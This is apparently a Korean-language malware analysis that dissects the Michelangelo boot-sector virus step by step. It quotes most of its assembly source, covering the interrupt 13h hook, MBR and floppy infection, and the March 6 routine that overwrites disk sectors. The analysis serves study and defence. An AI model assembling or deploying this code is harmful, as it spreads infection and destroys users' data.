# Michelangelo Virus
미켈란젤로 바이러스에 대해 분석

## What is Michelangelo virus?
미켈란젤로 바이러스는 1991년 2월 4일 호주에서 처음 발견되었다. 컴퓨터를 먹통으로 만들어버리는 Stoned 바이러스에서 파생되었으며, 메모리 크기를 2KB 줄이는것 외에는 가시적인 현상이 적어 사용자가 알아채기 힘들다. 평소에는 투명하게 운영되다가 3월 6일이 되면 하드디스크를 파괴한다. 이러한 특성때문에 3월 6일이 생일인 Michelangelo Buonarroti의 이름을 따서 미켈란젤로 바이러스라고 불리게 되었다

## 특징
* MBR 감염
* 주 메모리 크기를 2KB 줄임
* 인터럽트 13번을 후킹
* 3월 6일에 디스크 파괴

## 분석

``` asm
michelangelo    segment byte public
		assume  cs:michelangelo, ds:michelangelo
		org     0
		jmp     entervirus
highmemjmp      db      0F5h, 00h, 80h, 9Fh
maxhead         db      2
firstsector     dw      3
oldint13h       dd      0C8000256h
```
가장 먼저 michelangelo가 실행되면 0을 기준으로 code 세그먼트와 data 세그먼트를 설정하고, entervirus 위치로 점프한다. jmp 아래의 db와 dw, dd명령어는 각각 Define Byte, Define Word, Define Dword의 약자로 변수 선언과 같은 역할이다.

**⭐ STEP 1**  
스택 정리 및 추후 리턴해서 MBR에 돌아오기 위해 0:7C00값을 스택에 저장
``` asm
entervirus:
		xor     ax,ax
		mov     ds,ax
		cli
		mov     ss,ax
		mov     ax,7C00h
		mov     sp,ax
		sti
		push    ds
		push    ax
```
* ax를 초기화
* ds를 초기화
* 인터럽트 비활성화
* stack 세그먼트를 초기화
* ax에 7C00h(MBR의 시작주소)값을 넣는다
* stack 세그먼트를 7C00h로 설정
* 인터럽트 활성화
* data 세그먼트를 스택에 저장
* ax의 값(7C00h)를 스택에 저장   

코드 실행 이후 레지스터는 다음과 같이 설정된다.

|ax|bx|cx|dx|si|di|cs|ds|es|ss|sp|
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
7C00|0000|0000|0000|0000|0000|0000|0000|0000|0000|7C00|

코드 실행 이후 스택은 다음과 같이 설정된다.
|0000:7C00|
|:-:|
|0000|
|7C00|


**⭐ STEP 2**  
기존의 인터럽트 13의 코드 주소를 oldint13h라는 변수에 백업한다
``` asm
entervirus:
            ...
		mov     ax,ds:[13h*4]
		mov     word ptr ds:[7C00h+offset oldint13h],ax
		mov     ax,ds:[13h*4+2]
		mov     word ptr ds:[7C00h+offset oldint13h+2],ax
```
* ax에 0:4C의 2바이트를 넣는다  
(인터럽트당 4바이트의 주소가 존재하기 때문에 13번째 인터럽트는 13x4)
* 가져온 인터럽트 주소의 앞 2Byte(오프셋)를 oldint13h 변수에 넣는다
* ax에 0:4E의 2바이트를 넣는다
* 가져온 인터럽트 주소의 뒤 2Byte(세그먼트)를 oldint13h 변수 2바이트 뒤에 넣는다  

**⭐ STEP 3**  
응용 소프트웨어가 침범하지 못하는 공간을 확보하여 바이러스를 살려두기 위해 메모리 크기를 2KB만큼 줄인다. 
``` asm
entervirus:
            ...
		mov     ax,ds:[413h]
		dec     ax
		dec     ax
		mov     ds:[413h],ax
```
* 0:413에 저장되어있는 메모리 크기(KB) 정보를 ax로 읽어온다
* ax를 1 감소시킨다
* ax를 1 감소시킨다
* 0:413에 ax를 넣는다  

**⭐ STEP 4**  
확보한 메모리의 실제 주소를 백업
``` asm
entervirus:
            ...
		mov     cl,6
		shl     ax,cl
		mov     es,ax
		mov     word ptr ds:[7C00h+2+offset highmemjmp],ax
```
* cl에 6을 넣는다
* ax(줄인 메모리 크기) * 2<sup>6</sup>  
(메모리 크기 * 2<sup>10</sup> / 16 = 메모리 주소의 세그먼트 값)
* es에 줄인 메모리 주소의 세그먼트 값을 넣는다
* highmemjmp 변수의 3번째 바이트에다가 백업한다

**⭐ STEP 5**  
인터럽트 주소를 후킹한다. 후킹된 인터럽트 13은 확보된 공간을 가리키지만 현재 해당 공간에는 아무런 조치를 취하지 않았다. 이는 순서가 잘못되었지만 이 코드에서는 중간에 인터럽트 13을 호출하는 로직이 없기 때문에 오류는 없다.
``` asm
entervirus:
            ...
		mov     ax,offset int13h
		mov     ds:[13h*4],ax
		mov     ds:[13h*4+2],es
```
* ax에 새 인터럽트의 오프셋을 저장한다
* 인터럽트 테이블의 13번의 주소에 오프셋을 저장한다.
* 인터럽트 테이블의 13번의 주소에 세그먼트를 저장한다.  
(확보된 공간. STEP4 참고.)

**⭐ STEP 6**  
MBR의 코드영역을 확보된 공간에 복사한다. 새로운 인터럽트가 기능이 가능하게되며, 추후 코드 실행 위치가 이 확보된 공간으로 넘어간다.
``` asm
entervirus:
            ...
		mov     cx,offset partitioninfo
		mov     si,7C00h
		xor     di,di
		cld
		rep     movsb
```
* cx에 MBR의 파티션 데이터 상대주소를 저장한다.
* si에 메모리 MBR의 오프셋을 넣는다.
* di를 초기화 한다.
* cld를 통해  Direction 플래그를 초기화한다.(인덱스 레지스터 설정 = 증가)
* movsb를 반복하여 MBR 코드영역(파티션 데이터 전까지)을 확보한 공간으로 옮긴다.


**⭐ STEP 7**  
바이러스 코드를 백업했으니, 현재 MBR을 사용하지 않는다면 MBR 정보를 마음대로 바꿀  수 있게 된다. 다음은 악성코드로 실행 위치를 옮겨 다음 작업을 수행하게된다.
``` asm
entervirus:
            ...
		jmp     dword ptr cs:[7C00h+offset highmemjmp]
```
* 악성코드가 존재하는 위치로 점프한다.

**⭐ STEP 8**  
여기서부터는 확보된 공간에서 수행되는 명령들이다. 본격적인 확인 및 감염 동작이 시작된다. 아래 코드는 디스크에 접근하기 위한 초기화 과정이다.
``` asm
entervirus:
			...
		xor     ax,ax
		mov     es,ax
		int     13h
```
* 인터럽트 0번 함수를 호출하기 위해 ax를 초기화한다.
* es를 초기화해서 세그먼트 0을 가리키게 한다.(step 9에서 사용)
* 인터럽트 13번의 0번 함수가 호출되어 디바이스에 접근할 수 있도록 초기화한다.

**⭐ STEP 9**  
아래 코드는 감염여부를 따져 감염되었다면 정상부팅을, 감염되지 않았다면 디스크 종류에 따라 코드진행을 다르게 한다. 하드디스크일 경우에만 메모리 MBR을 원래대로 복구한다.
``` asm
entervirus
			...
		push    cs
		pop     ds
		mov     ax,201h
		mov     bx,7C00h
		mov     cx,firstsector
		cmp     cx,7
		jne     floppyboot
		mov     dx,80h
		int     13h
		jmp     short exitvirus
```
* cs를 백업한다.
* 스택에서 cs값을 꺼내 ds에 넣는다. ds도 현재 위치(여분공간)의 세그먼트를 가리킨다.
* ax에 201h를 넣는다. 인터럽트 13번의 2번함수를 가리키며, 읽을 섹터를 1개로 지정한다.
* bx에 메모리 MBR의 오프셋을 넣는다.
* cx에 현재 장치의 종류를 구분할 수 있는 번호를 넣는다
* cx를 7과 비교한다.(7은 하드디스크)
* 하드디스크가 아니라면 floppyboot로 분기하여 다른 처리를 한다. 하드디스크가 맞다면 하드디스크는 이미 감염되어있으므로 프로세스를 마무리한다.
* dx에 80h를 넣는다.
* 인터럽트 13번의 2번함수를 통해 HDD(80h)를 CHS(0,0,7)부터 1개의 섹터를 메모리 MBR(ES:BX)에 읽어 원본MBR을 복구한다.
* exitvirus를 통해 정상부팅을 시작한다.

**⭐ STEP 10 - 하드디스크**  
하드디스크일 경우 exitvirus로 빠지게 된다. 이 로직에서는 오늘 날짜를 구해 3월 6일이 아니라면 정상부팅을 진행하고, 3월 6일이면 공격을 시작한다.
``` asm
exitvirus:
		xor     cx,cx
		mov     ah,4
		int     1Ah
		cmp     dx,306h
		je      damagestuff
		retf
```
* cx를 초기화한다(?)
* ah에 4를 넣어 인터럽트 1Ah의 4번함수를 지정한다.
* 인터럽트 1Ah의 4번 함수를 통해 실제 시간을 불러온다.
* 리턴값 중 dx에 담긴 월,일 정보를 가져와 306h(3월 6일)과 비교한다.
* 3월 6일이 맞다면 damagestuff로 분기하여 공격을 시작한다.(공격 어셈은 후반부에 설명)
* 3월 6일이 아니라면 아무 공격 없이 정상 부팅을 진행한다.

**⭐ STEP 10 - 플로피디스크 - 1**  
step 9에서 플로피디스크로 판단이 되면 아래 로직으로 넘어온다. 아래 코드는 메모리 MBR을 원래대로 복구하는 과정이다.
``` asm
floppyboot:
		mov     cx,firstsector
		mov     dx,100h
		int     13h
		jc      exitvirus
```
* cx에 현재 장치를 구분하는 값을 넣는다.
* dx에 100h를 넣어 1번 헤드를 가리킨다.
* 인터럽트 13번의 2번함수를 통해 360K 플로피 디스크 CHS(0,1,3) 또는 그 외 플로피 디스크 CHS(0,1,0E)로부터 1개의 섹터를 메모리 MBR(ES:BX)에 읽어 원본MBR을 복구한다.
* 실패하면 Carry 플래그를 체크하여 exitvirus로 분기하여 악성코드를 종료한다.

**⭐ STEP 10 - 플로피디스크 - 2**  
다음 코드는 원본 MBR을 여유공간의 바이러스 뒤에 백업하는 과정이다.
``` asm
floppyboot:
			...
		push    cs
		pop     es
		mov     ax,201h
		mov     bx,200h
		mov     cx,1
		mov     dx,80h
		int     13h
		jc      exitvirus
```
* cs를 백업한다(7C00)
* 스택에서 cs를 꺼내 es에 넣어 es도 메모리 뒤 2KB를 가리키도록 한다.
* ax에 201h를 넣어 인터럽트 13의 2번함수를 지정하고, 한개의 섹터를 읽도록 지정한다.
* bx에 200h를 넣어 여분 공간에 존재하는 악성코드 뒤 오프셋을 가리키도록 한다.
* cx에 1을 넣어 0번 실린더, 1번 섹터를 가리킨다.
* dx에 80h를 넣어 0번 헤드 80h와 상응하는 장치를 지정한다.
* 인터럽트 13번 2번 함수를 호출해서 CHS(0,0,1)로부터 1개의 섹터를 여유공간의 바이러스 뒤에 읽어 원본 MBR을 백업한다.

**⭐ STEP 10 - 플로피디스크 - 3**  
다음 코드는 백업한 원본 MBR의 처음 4바이트 시그니처를 바이러스와 비교하여 감염여부를 확인하는 코드다.
``` asm
floppyboot:
			...
		xor     si,si
		cld
		lodsw
		cmp     ax,[bx]
		jne     infectharddisk
		lodsw
		cmp     ax,[bx+2]
		jne     infectharddisk
```
* si를 초기화한다.
* Direction 플래그를 설정한다.(인덱스 증가방향)
* 여분공간의 맨 처음(DS:SI)을 읽어 ax에 저장한다.
* 백업한 정상 MBR 첫 두 바이트와 바이러스 첫 두 바이트를 비교한다.
* 시그니처가 다르다면 infectharddisk로 분기한다.
* 우연의 일치의 상황을 막고자 다음 두 바이트를 불러온다.
* 뒤 두 바이트의 시그니처를 비교한다.
* 감염되지 않았다면 역시 infectharddisk로 점프한다.  
*감염되었다면 다음 exitvirus 로직으로 넘어가 악성코드를 종료한다.*

**⭐ STEP 11**  
지금까지가 감염 여부 확인이었다면 이제부터는 실제 감염동작이 시작된다. 다음 코드는 디스크 여유공간에 원본 MBR을 저장하는 과정이다.
``` asm
infectharddisk:
		mov     cx,7
		mov     firstsector,cx
		mov     ax,301h
		mov     dx,80h
		int     13h
		jc      exitvirus
```
* cx에 7을 넣는다.(HDD임을 표시하는 숫자)
* 감염이 안됐다는 것은 해당 디스크는 HDD라는 것을 알 수 있으므로 firstsector에 cx를 넣는다.
* ax에 301h를 넣어 인터럽트 3번 함수를 지정하고, 1개의 섹터를 작성하도록 지정한다.
* dx에 80h를 넣어 0번 헤드를 지정하고, HDD(80h)에 작성할 것임을 지정한다.
* 인터럽트 13번 3번 함수를 호출해서 HDD CHS(0,0,7)에 백업한 원본 MBR(ES:BX)을 복사한다.
* 실패하면 캐리 플래그를 검사하여 exitvirus로 분기해서 종료한다.

**⭐ STEP 12**  
다음 코드는 바이러스가 잘 동작하기 위해 원본 파티션 정보를 바이러스 파티션 정보에 덮어쓰는 과정이다.
``` asm
infectharddisk:
			...
		mov     si,200h+offset partitioninfo
		mov     di,offset partitioninfo
		mov     cx,21h
		rep     movsw

```
* si에 여분 공간의 원본 MBR 데이터 속 파티션 정보들의 오프셋을 넣는다.
* di에 바이러스의 파티션 정보의 오프셋을 넣는다.
* cx에 21h를 넣어 21h 만큼 반복시킨다. MBR(512B)-MBRcode(446B) = 66B = 33word(21h)
* 원본 파티션 정보를 바이러스 파티션 정보에 덮어쓴다.

**⭐ STEP 13**  
다음 코드는 실제 MBR에 바이러스를 삽입하는 과정이다.
``` asm
infectharddisk:
			...
		mov     ax,301h
		xor     bx,bx
		inc     cl
		int     13h
```
* ax에 301h를 넣어 3번함수를 지정하고, 1개의 섹터 수를 지정한다.
* bx를 초기화하여 오프셋을 0을 가리키도록 지정한다.
* cl을 1 증가시켜 1번 섹터를 가리키도록 지정한다.
* 인터럽트 13번의 3번함수를 통해 디스크 MBR CHS(0,0,1)에 바이러스를 넣는다.

**⭐ STEP 14**  
다음 코드는 시스템 크래시를 고의적으로 발생시켜 재부팅 시키는 과정이다. 별도의 코드 없이 재검사를 실시할 수 있다.
``` asm
infectharddisk:
			...
		jmp     short 01E0h
		db      0EBh, 32h
```
* 파티션 정보가 담긴 위치로 점프한다.
* 파티션 정보는 코드가 아닌 데이터이므로 시스템 크래시가 발생되어 재부팅한다

**⭐ STEP 15**  
다음 코드부터는 해커가 후킹하려고 하는 새로운 인터럽트 13의 코드 내용이다. 아래 코드는 기본 드라이브인지 아닌지 체크해서 기본 드라이브가 아니면 정상적인 인터럽트를 실행하는 exitint13h를 호출한다.
``` asm
int13h:
		push    ds
		push    ax
		or      dl, dl   
		jnz     exitint13h         ; 기본 드라이브가 아니라면 패스
```
* ds를 백업한다.
* ax를 백업한다.
* or연산을 통해 dl이 0인지 아닌지 확인한다(제로 플래그)
* 기본 드라이브(0)이 아니라면 exitint13h로 분기

**⭐ STEP 16**  
이 부분은 코드 내에서 호출하는 부분은 없다. 하지만 실제 PC 운용시에 발생하는 인터럽트에 대해 후킹하여 감염 여부를 체크한다. 실제로 아래는 후킹에 사용될 코드의 내용이다. 처음에는 드라이브를 체크하는 코드부터 시작한다.
``` asm
int13h:
			...
		xor     ax, ax
		mov     ds, ax
		test    byte ptr ds:[43fh], 1
		jnz     exitint13h       ; 드라이브가 작동하지 않으면 패스
```
* ax를 초기화한다
* ds를 초기화한다
* test로 1과 and 연산을 해서 \[43h\]의 값이 0인이 확인
* 위 연산의 결과를 제로플래그로 확인하여, 0이 아닌 경우는 드라이브의 팬이 돌아가지 않는다는 뜻이며, 드라이브가 정상적으로 작동하지 않는다는 뜻이므로 exitint13h로 분기한다.

**⭐ STEP 17**  
드라이브가 정상적인지 확인이 되었다면 정상 작동을 유지하기 위해 원래 인터럽트를 호출하고,
 감염 여부를 확인한다.
``` asm
int13h:
			...
		pop     ax
		pop     ds
		pushf
		call    dword ptr cs:[oldint13h] ; 원래 인터럽트 호출
		pushf
		call    infectdisk       ; infect 호출
		popf
		retf    2       ; 추가로 2Byte를 리턴(플래그)
```
* 백업했던 ax를 복구해서 원래 인터럽트에 전달할 데이터들을 유지한다
* 백업했던 ds도 같은 이유로 복구한다
* 플래그들을 백업한다
* 본래 인터럽트를 호출한다
* 플래그들을 백업한다
* infectdisk를 호출하여 감염을 진행한다.
* 플래그들을 복원한다.
* 리턴함과 동시에 2바이트만큼 스택에서 더 꺼내어 플래그를 복원한다.

**⭐ STEP 18**  
후킹한 인터럽트를 종료하는 코드다. 호출 당시 데이터를 유지한채 실행을 원래 인터럽트로 넘긴다.
``` asm
exitint13h:
	    pop     ax
		pop     ds
		jmp     dword ptr cs:[oldint13h] ; 원래 인터럽트로 분기
```
* 백업했던 ax를 복구해서 원래 인터럽트에 전달할 데이터들을 유지한다
* 백업했던 ds도 같은 이유로 복구한다.
* 원래 인터럽트로 실행을 넘겨버린다.

**⭐ STEP 19**  
다음은 감염을 위해 데이터들을 모두 백업시켜놓는 과정이다.
``` asm
infectdisk:
		push    ax
		push    bx
		push    cx
		push    dx
		push    ds
		push    es
		push    si
		push    di
		push    cs
		pop     ds
		push    cs
		pop     es
		mov     si, 4                    ; 루프 4번 설정
```
* 레지스터 사용을 위해 범용레지스터들을 스택에 백업해놓는다.
* cs를 백업한다
* 스택에서 cs를 꺼내 ds에 넣는다.
* cs를 백업한다
* 스택에서 cs를 꺼내 es에 넣는다.
* si를 4로 설정하여 추후 반복시 반복 횟수가 4회가 되도록 한다.


**⭐ STEP 20**  
다음은 감염여부를 확인하기 위해 여유공간 바이러스 뒤에 MBR을 읽어들이는 코드다. 오류에 의해 잘 읽히지 않는다면 최대 4번까지 재시도한다.
``` asm
readbootblock:
		mov     ax,201h
		mov     bx,200h
		mov     cx,1
		xor     dx,dx
		pushf
		call    oldint13h  ; a 드라이브 CHS(0,0,1) ES:BX(9F80:0200)읽기
		jnc     checkinfect      ; 읽기 성공하면 checkinfect 점프
		xor     ax,ax
		pushf
		call    oldint13h
		dec     si
		jnz     readbootblock      ; 최대 4번까지 재검사
		jmp     short quitinfect     ; 그래도 안되면 quitinfect로 점프(종료)
```
* ax에 201h를 넣어 2번 함수를 지정하고, 1개의 섹터를 읽도록 지정
* bx에 200h를 넣어 여유 공간의 바이러스 뒤를 가리킨다.
* cx를 1로 설정하여 실린더 0, 섹터 1을 가리킨다
* dx를 초기화하여 HDD를 지정하고, 0번 헤드를 가리킨다.
* 플래그를 스택에 백업한다
* 인터럽트 13번 2번 함수를 호출하여 HDD의 CHS(0,0,1)을 여유 공간의 바이러스 뒤에 읽어온다.
* 성공적으로 읽어졌다면 이미 감염이 되었는지 체크하기 위해 checkinfect로 분기한다.
* 정상적으로 읽어지지 않았다면 ax를 초기화하여 0번 함수를 가리킨다.
* si를 감소시킨다. 이전에 루프를 돌기위해 4로 설정해주었다.
* readbootblock로 분기해서 다시 읽어온다. 4번을 시도해도 실패하면 분기하지 않는다.
* 일기를 실패했으므로 quitinfect로 분기하여 종료한다.

**⭐ STEP 21**  
여분공간의 앞에있는 바이러스의 앞 4바이트와 뒤에있는 MBR의 앞 4바이트를 비교하여 감염여부를 판단한다.
``` asm
checkinfect:
		xor     si,si
		cld
		lodsw
		cmp     ax,[bx]
		jne     infectitnow
		lodsw
		cmp     ax,[bx+2]         ; 앞 4바이트 비교를 통해 감염 여부 확인
		je      quitinfect              ; 감염 되었다면 quitinfect로 점프
```
* si를 초기화한다.
* Direction 플래그를 설정한다.(인덱스 증가방향)
* ax에 바이러스 처음 앞 2바이트를 읽어온다
* 이전에 읽어왔던 디스크의 MBR과 앞 2바이트를 비교한다
* 다르다면 감염을 시작하기 위해 infectitnow를 호출한다
* 읽었던 2바이트 뒤의 2바이트를 ax에 읽어온다
* 가져온 MBR의 뒤 2바이트와 비교한다
* 같다면 감염되었다는 뜻으로, quitinfect로 분기하여 종료한다.

**⭐ STEP 22**  
정상 부팅을 위해 원본MBR을 저장해두어야 하는데 디스크마다 다른 영역에 저장을 한다. 잘 사용하지 않는 공간이며, 360K FDD는 CHS(0,1,3), 그 외 FDD는 CHS(0,1,E)에 덮어쓴다고 지정한다.
``` asm
infectitnow:
		mov     ax,301h
		mov     dh,1
		mov     cl,3                    ; CHS(0,1,3)
		cmp     byte ptr [bx+15h],0FDh
		je      is360Kdisk     ; 360K 프로피디스크면 is360disk 점프
		mov     cl,0Eh                  ; CHS(0,1,E)
```
* ax에 301h를 넣어 3번 함수를 지정하고, 1개의 섹터만큼 쓰겠다고 지정
* dh에 1을 넣어 1번 헤드를 가리킨다.
* cl에 3을 넣어 3번 섹터를 가리킨다.
* 디스크 정보가 360K 플로피 디스크인지 비교
* 360K 플로피디스크면 is360Kdisk로 분기
* cl에 0Eh를 넣어 0Eh번 섹터를 가리킨다.

**⭐ STEP 23**  
지정한 디스크 공간에 원본 MBR을 백업한다. 설정한 여유공간의 섹터 번호가 firstsector가 된다
``` asm
is360Kdisk:
		mov     firstsector,cx   ; 디스크 정보 저장
		pushf
		call    oldint13h  ; 디스크에 원본 MBR 저장
		jc      quitinfect  ; 실패하면 quitinfect로 점프(종료)
```
* firstsector에 cx에 담긴 섹터 번호를 저장한다.
* 플래그를 백업한다
* 원본 인터럽트 13의 3번 함수를 호출해서 디스크의 여분 공간에 원본 MBR을 저장한다.
* 성공적으로 수행했다면 quitinfect로 분기하여 종료한다.

**⭐ STEP 24**  
백업이 되었으니, 바이러스를 옮겨야 하는데 바이러스를 옮겨서 정상적으로 부팅시키기 위해 바이러스 코드 뒤의 파티션 정보를 설정해주어야 한다. 다음 코드는 원본 MBR의 파티션 정보를 바이러스로 복사하는 과정이다.
``` asm
is360Kdisk:
			...
		mov     si,200h+offset partitioninfo
		mov     di,offset partitioninfo
		mov     cx,21h
		cld
		rep     movsw          ; 파티션 정보 복사(word단위)
```
* si에 여분공간에 있는 정상 MBR의 파티션 정보 오프셋을 넣는다
* di에 여분공간에 있는 바이러스의 파티션 정보 오프셋을 넣는다
* cx에 21h를 넣어 21h번 반복하도록 설정한다
* cld를 통해  Direction 플래그를 초기화한다.(인덱스 레지스터 설정 = 증가)
* 여분공간에서 원본 MBR의 파티션 정보를 바이러스의 파티션 정보에 덮어씌운다.

**⭐ STEP 25**  
완성된 바이러스 MBR을 실제 MBR에 덮어쓰는 과정이다.
``` asm
is360Kdisk:
			...
		mov     ax,301h
		xor     bx,bx
		mov     cx,1
		xor     dx,dx
		pushf
		call    oldint13h    ; 9F80:0의 데이터를 CHS(0,0,1)에 저장
```
* ax에 301h를 넣어 3번 함수를 지정하고, 1개의 섹터만큼 쓰기를 지정한다.
* bx를 초기화하여 오프셋 0을 가리키도록 한다.
* cx에 1을 넣어 실린더 0번을, 섹터 1번을 가리킨다
* dx를 초기화하여 0번 헤드와 하드디스크를 지정한다.
* 플래그를 백업한다.
* 원본 인터럽트 13의 3번함수를 호출하여 여분공간에 있는 바이러스 MBR을 CHS(0,0,1)에 쓴다.

**⭐ STEP 26**  
감염이 완료되었으니 리턴한다.
``` asm
quitinfect:
		pop     di
		pop     si
		pop     es
		pop     ds
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		retn
```
* 레지스터들을 모두 스택에서 꺼내 해당 루프가 시작되던 지점으로 복원한다.
* 리턴한다.

**⭐ STEP 27**  
이 아래에 있는 코드는 3월 6일이 되어 실제로 디스크를 파괴하는 로직이다. 다음은 디스크 가장 앞단부터 파괴하기 위해 CHS를 설정하는 코드다.
``` asm
damagestuff:
		xor     dx,dx
		mov     cx,1
```
* dx를 초기화 해서 오프셋을 0을 가리킨다.
* cx를 1로 설정하여 실린더를 0으로, 섹터를 1을 가리킨다.

**⭐ STEP 28**  
다음은 각 디스크별로 헤더, 섹터 개수가 다르므로 각각 HDD면 17섹터, 360K FDD는 9섹터, 그 외 FDD면 14섹터만큼 쓰기를 지정해준다.
``` asm
smashanothersector:
		mov     ax,309h
		mov     si,firstsector
		cmp     si,3
		je      smashit                  ; 360K FDD(3)면 9섹터 만큼
		mov     al,0Eh
		cmp     si,0Eh
		je      smashit                  ; 그 외 FDD(0E)면 14섹터 만큼
		mov     dl,80h
		mov     maxhead,4
		mov     al,11h                   ; HDD면 17개 섹터만큼
```
* ax에 309h를 넣어 3번 함수를 지정하고, 9개의 섹터를 쓰도록 지정한다.
* si에 현재 디스크를 구분가능한 데이터를 넣는다.
* si가 360K FDD(3)인지 검사한다.
* 맞다면 그대로 smashit으로 분기하여 공격한다.
* al에 0Eh를 넣어 0Eh개의 섹터를 쓰도록 지정한다.
* si가 그 외 FDD(0E)인지 검사한다.
* 맞다면 그대로 smashit으로 분기하여 공격한다.
* 여기부터는 HDD의 경우이기 때문에 dl에 80h를 넣어 HDD 1을 지정한다.
* maxhead에 4를 넣어 반복을 4번으로 설정한다.

**⭐ STEP 29**  
실제로 디스크 파괴가 이루어지는 코드다. 5000:5000 이라는 연관성 없는 데이터로 처음부터 덮어쓴다.
``` asm
smashit:
		mov     bx,5000h
		mov     es,bx
		int     13h                     ; 5000:5000의 데이터로 디스크 덮어쓰기
		jnc     skiponerror
		xor     ah,ah
		int     13h                     ; 실패하면 디스크 사용 선언
```
* bx에 5000h를 넣어 상관없는 메모리 오프셋을 가리킨다
* es에도 5000h를 넣어 상관없는 메모리 오프셋을 가리킨다.
* 인터럽트 13번의 3번 함수를 호출하여 디스크의 해당 공간을 5000:5000의 데이터로 덮어쓴다.(공격)
* 성공했다면 skiponerror로 분기한다.
* 실패했다면 ah를 초기화하여 0번 함수를 지정한다.
* 인터럽트 13번의 0번 함수를 호출하여 디스크 공간을 사용하겠다고 초기화한다.

**⭐ STEP 30**  
디스크 파괴가 이루어졌다면 다음 헤드, 다음 섹터를 반복하여 공격해서 전체를 파괴시킨다.
``` asm
skiponerror:
		inc     dh
		cmp     dh,maxhead              ; FDD는 2번 HDD는 4번 반복
		jb      smashanothersector      ; 다음 헤드 공격하기
		xor     dh,dh
		inc     ch
		jmp     short smashanothersector ; 다음 실린더 공격하기
```
* dh를 증가시킨다.
* dh와 maxhead를 비교하여 헤드 개수만큼 반복이 되었는지 체크한다.(FDD는 2번 HDD는 4번 반복)
* dh가 더 작다면 smashanothersector로 분기하여 다음 헤드를 공격한다.
* 헤드 개수만큼 반복이 끝났다면 dh를 초기화한다.
* ch를 증가시켜 다음 실린더를 가리킨다
* smashanothersector로 분기하여 다음 실린더를 공격한다.